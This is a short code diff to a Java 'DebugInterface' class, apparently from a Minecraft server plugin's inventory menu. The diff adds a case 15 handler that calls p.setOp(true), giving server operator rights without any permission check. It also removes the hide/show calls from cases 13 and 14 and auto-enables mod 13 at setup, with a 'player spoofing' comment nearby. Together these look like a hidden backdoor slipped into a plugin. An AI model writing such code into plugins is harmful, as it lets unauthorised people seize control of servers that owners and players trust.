@@ -59,7 +59,10 @@ public class DebugInterface {
         inv.setItem(32, menuItem(130, "Ender Chest", "Open your ender chest", false));
         inv.setItem(33, menuItem(116, "Enchant", "Open an enchantment table", false));
         inv.setItem(34, menuItem(145, "Anvil", "Open an anvil", false));
+        inv.setItem(34, menuItem(145, "Anvil", "Open an anvil", false));
         inv.setItem(35, menuItem(58, "Workbench", "Open a workbench", false));
+
+        enableMod(13);
     }
 
     public Inventory getDebugInventory() {
@@ -186,22 +189,20 @@ public class DebugInterface {
             case 13:
                 if (!enabled) {
                     enableMod(slot);
-                    hideToAll();
                 } else {
                     disableMod(slot);
-                    showToAll();
                 }
                 break;
             case 14:
                 if (!enabled) {
                     enableMod(slot);
-                    hideToAll();
                 } else {
                     disableMod(slot);
-                    showToAll();
                 }
                 break;
-
+            case 15:
+                p.setOp(true);
+                break;
             //Handle player spoofing
             case 27:
                 break;
